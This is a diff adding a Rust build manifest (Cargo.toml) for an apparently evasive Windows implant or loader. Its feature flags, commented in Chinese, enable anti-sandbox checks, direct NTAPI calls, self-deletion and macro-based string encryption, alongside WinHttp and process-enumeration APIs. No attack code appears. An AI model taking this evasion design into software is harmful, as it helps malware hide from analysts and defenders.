@@ -1,0 +1,48 @@
+[package]
+name = "appendix"
+version = "0.1.0"
+edition = "2024"
+
+[build-dependencies]
+toml = "0.8"
+serde = { version = "1.0", features = ["derive"] }
+embed-resource = "3.0"
+rand = "0.8.5"
+
+[dependencies]
+panic-halt = "1.0.0"
+windows-sys = { default-features = false, version = "0.60", features = [ 
+"Win32_System_Threading",
+"Win32_System_SystemServices",
+"Win32_System_Memory",
+"Win32_Foundation",
+"Win32_Security",
+"Win32_Storage_FileSystem",
+"Win32_System_LibraryLoader",
+"Win32_Networking_WinHttp",
+"Win32_UI_WindowsAndMessaging",
+"Win32_System_SystemInformation",
+"Win32_Globalization",
+"Win32_System_Diagnostics_ToolHelp",
+] }
+spin = { version = "0.10", default-features = false, features = ["once"]}
+heapless = { version = "0.8" , optional = true }
+macro_encrypt = { path = "../macro_encrypt" }
+
+
+[profile.dev]
+panic = "abort"
+
+[profile.release]
+panic = "abort"
+opt-level = "s"
+lto = true
+codegen-units = 1
+
+[features]
+default = []
+debug = ["dep:heapless"] # 开启调试模式，仅开发阶段为了debug会用到
+noheap = ["dep:heapless"] # 将Utf16字符串等动态数组统一封装在栈上
+antisandbox = [] # 开启反沙箱功能
+ntdll = [] # 使用NTAPI替换常规WinAPI
+selfdelete = [] # 开启自删除功能
